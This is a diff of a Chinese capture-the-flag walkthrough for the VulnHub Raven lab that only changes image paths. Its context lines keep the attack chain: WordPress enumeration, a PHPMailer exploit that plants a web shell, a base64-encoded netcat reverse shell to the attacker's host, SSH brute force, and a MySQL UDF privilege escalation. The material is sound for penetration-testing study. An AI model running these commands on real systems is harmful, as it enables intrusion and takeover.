@@ -14,13 +14,13 @@
 
 若想要模拟真实，可以采用`nmap`等工具
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\1.jpg)
+![](./pic-1/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\2.jpg)
+![](./pic-1/2.jpg)
 
 ## 网站信息探测
 
@@ -28,11 +28,11 @@
 
 查看页面源代码，发现`blog`这个不是`html`，而是目录，名为`wordpress`，并且`contact`是`php`，也就是`contact.php`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\3.jpg)
+![](./pic-1/3.jpg)
 
 可点的菜单都点一下，在点击`blog`，跳转到`wordpress`界面，不过内容的显示有问题
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\4.jpg)
+![](./pic-1/4.jpg)
 
 当点击`hello world`时，跳转到一个域名，因为这里是靶机，所以只有一个`ip`地址，把这个`ip`绑定到本地的`hosts`文件中，本地解析即可，`windows`和`linux`对于这个文件的位置不同
 
@@ -40,15 +40,15 @@
 
 下面我以`linux`为例添加，在`/etc/hosts`这里添加即可
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\6.jpg)
+![](./pic-1/6.jpg)
 
 这时候再访问即可发现已经成功
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\7.jpg)
+![](./pic-1/7.jpg)
 
 可以再使用`whatweb`进一步确定是否为`wordpress`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\8.jpg)
+![](./pic-1/8.jpg)
 
 既然已经知道是`wordpress`，那么使用针对该CMS的工具`wpscan`进行测试，发现`xmlrpc.php`是开启的，并且`wordpress`的版本确实为`4.8.7`
 
@@ -56,7 +56,7 @@
 wpscan --url http://raven.local/wordpress
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\9.jpg)
+![](./pic-1/9.jpg)
 
 进一步测试，看能否枚举出一些用户，发现用户`michael`和`steven`
 
@@ -64,7 +64,7 @@ wpscan --url http://raven.local/wordpress
 wpscan --url http://raven.local/wordpress -e u
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\10.jpg)
+![](./pic-1/10.jpg)
 
 尝试进行密码破解，但是时间太长，估计不是这个方法，再尝试枚举插件，看能否有可利用的，发现还是没有
 
@@ -72,7 +72,7 @@ wpscan --url http://raven.local/wordpress -e u
 wpscan --url http://raven.local/wordpress --detection-mode aggressive --plugins-detection aggressive
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\11.jpg)
+![](./pic-1/11.jpg)
 
 # 漏洞寻找
 
@@ -85,7 +85,7 @@ gobuster dir -u http://192.168.10.16 -w /usr/share/wordlists/dirb/big.txt -x php
 #-d 参数，就是寻找备份文件格式
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\16.jpg)
+![](./pic-1/16.jpg)
 
 使用`ffuf`进行参数测试，假设有路径遍历，发现一个传参`action`
 
@@ -93,21 +93,21 @@ gobuster dir -u http://192.168.10.16 -w /usr/share/wordlists/dirb/big.txt -x php
 ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://raven.local/contact.php?FUZZ=../../../../etc/passwd
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\12.jpg)
+![](./pic-1/12.jpg)
 
 但是在浏览器测试，发现是多出一串字符提示，说是确实字段，可能这里的传参不止一个，需要同时具有这些传参才行
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\13.jpg)
+![](./pic-1/13.jpg)
 
 因为是在`contact.php`界面，所以把这个页面中的留言也测试一下，通过`burp`抓取发送时的数据包
 
 抓取到一个`mail.php`，并且感觉这里的参数就是提示中缺失的字段
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\14.jpg)
+![](./pic-1/14.jpg)
 
 经过参数测试，发现当`name`、`email`、`message`三个参数存在时，就会提示"信息已发送"
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\15.jpg)
+![](./pic-1/15.jpg)
 
 但是这里在`message`中写入什么都没有回显啊，尝试访问`mail.php`，发现提示`404`，但是提交的时候确实有这个文件。后面再抓包，发现原来是漏抓了，不过这里的数据包也可以
 
@@ -119,25 +119,25 @@ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://raven.local/contact.php?F
 
 查看一下`service.html`，发现原界面没发现，但是在页面源代码的最后，发现一个`flag`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\21.jpg)
+![](./pic-1/21.jpg)
 
 
 
 把压缩包`contact.zip`下载并查看，解压后，发现是`contact.php`的源码，发现参数与前面猜测的一样，并且还出现一个`php`文件，提示是`phpmailer`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\17.jpg)
+![](./pic-1/17.jpg)
 
 百度搜索，这是`php`中的一个库，用于发送邮件的
 
 查看`vendor`目录，发现这里面包含`phpmailer`的信息，可以从这里下手
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\18.jpg)
+![](./pic-1/18.jpg)
 
 查看`VERSION`发现是对应的版本号`5.2.16`
 
 查看`SECURITY.md`发现，这里面竟然包含版本对应的漏洞，设置编号都给出了
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\19.jpg)
+![](./pic-1/19.jpg)
 
 # 漏洞利用
 
@@ -151,7 +151,7 @@ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://raven.local/contact.php?F
 
 这个漏洞还可用于`wordpress`在进行忘记密码时的操作
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\20.jpg)
+![](./pic-1/20.jpg)
 
 查看对应的脚本代码，这里是构建好的，执行脚本时，带着靶机地址和存在漏洞的页面即可
 
@@ -197,11 +197,11 @@ echo '[+] Exiting'
 
 先执行脚本，可能如下，但是不用管，是已经上传成功的。访问`192.168.10.16/ppp.php`即可，这里的提示不用管它
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\22.jpg)
+![](./pic-1/22.jpg)
 
 访问即可观察到，这里的`aWQ=`是命令`id`的，所以会这样显示，说明成功
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\23.jpg)
+![](./pic-1/23.jpg)
 
 那么尝试写入一个反弹`shell`，然后进行`base64`编码，测试常用的`bash`命令不行，就以`nc`
 
@@ -213,7 +213,7 @@ bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTAuMiA5OTk5
 
 先在`kali`中开启监听9999端口，然后浏览器访问，即可反弹成功
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\23-1.jpg)
+![](./pic-1/23-1.jpg)
 
 
 
@@ -231,15 +231,15 @@ hydra -L user -P /usr/share/wordlists/rockyou.txt 192.168.10.16 ssh
 
 很快就出现一个，让其继续爆破
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\24.jpg)
+![](./pic-1/24.jpg)
 
 登录这个账户，确实可行
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\25.jpg)
+![](./pic-1/25.jpg)
 
 回到网站目录，查看之前测试`php mailer`的脚本，发现脚本`ppp.php`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\26.jpg)
+![](./pic-1/26.jpg)
 
 还有其他脚本，这里就不演示了
 
@@ -256,31 +256,31 @@ uname -r
 cat /etc/issue
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\27.jpg)
+![](./pic-1/27.jpg)
 
 查看网络状态信息
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\28.jpg)
+![](./pic-1/28.jpg)
 
 发现数据库，那么尝试去登录，先去`wordpress`网站测试，一般网站存在与后端交互的情况，可能有数据库的连接信息
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\29.jpg)
+![](./pic-1/29.jpg)
 
 数据库连接的用户名`root`和密码`R@v3nSecurity`
 
 不过在目录查看时，无意发现`flag2`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\30.jpg)
+![](./pic-1/30.jpg)
 
 连接数据库，发现其中`wordpress`只有两个用户，不过另一个是以`hydra`还未破解出
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\31.jpg)
+![](./pic-1/31.jpg)
 
 尝试对`steven`的密码进行破解，这里可以先使用在线网站破解，`cmd5.com`或`somd5.com`
 
 解出密码`pink84`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\32.jpg)
+![](./pic-1/32.jpg)
 
 # 提权
 
@@ -292,11 +292,11 @@ cat /etc/issue
 find / -perm -4000 -print 2>/dev/null
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\33.jpg)
+![](./pic-1/33.jpg)
 
 使用上面解出的`steven`密码切换到`steven`，然后再使用`sudo`，发现有一个可以
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\34.jpg)
+![](./pic-1/34.jpg)
 
 那么可以使用`python`导入然后获取`shell`
 
@@ -304,7 +304,7 @@ find / -perm -4000 -print 2>/dev/null
 sudo python -c 'import os;os.system("/bin/bash")'
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\35.jpg)
+![](./pic-1/35.jpg)
 
 等会，`flag4`？ 我前面只到`flag2`，3呢，我回头找找
 
@@ -322,7 +322,7 @@ sudo python -c 'import os;os.system("/bin/bash")'
 show global variables like 'secure%';
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\36.jpg)
+![](./pic-1/36.jpg)
 
 
 
@@ -332,13 +332,13 @@ show global variables like 'secure%';
 
 查看`mysql`的版本信息，确定需要知道插件的路径
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\36-1.jpg)
+![](./pic-1/36-1.jpg)
 
 ```mysql
 show variables like '%plugin%';
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\37.jpg)
+![](./pic-1/37.jpg)
 
 在`kali`中搜索漏洞
 
@@ -346,11 +346,11 @@ show variables like '%plugin%';
 searchsploit mysql 5.0 udf
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\38.jpg)
+![](./pic-1/38.jpg)
 
 查看`c`文件，其中有用法
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\39.jpg)
+![](./pic-1/39.jpg)
 
 先在`kali`中编译为`.so`文件，因为在靶机测试，编译出问题，然后下载到靶机
 
@@ -359,7 +359,7 @@ gcc -g -c 1518.c
 gcc -g -shared -Wl,-soname,test.so -o 1518.so 1518.o -lc
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\40.jpg)
+![](./pic-1/40.jpg)
 
 在靶机内连接数据库，执行下面命令
 
@@ -373,15 +373,15 @@ select * from mysql.func;
 select do_system('chmod u+s /bin/bash');
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\41.jpg)
+![](./pic-1/41.jpg)
 
 这时候查询是否成功，并执行`do_system()`，以进行提取，当然这里不止这一种方式，对于其他的可以再尝试
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\42.jpg)
+![](./pic-1/42.jpg)
 
 查看`/bin/bash`的权限，发现确实是变为`suid`权限了，执行后，提取至`root`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\raven系列\pic-1\43.jpg)
+![](./pic-1/43.jpg)
 
 
 
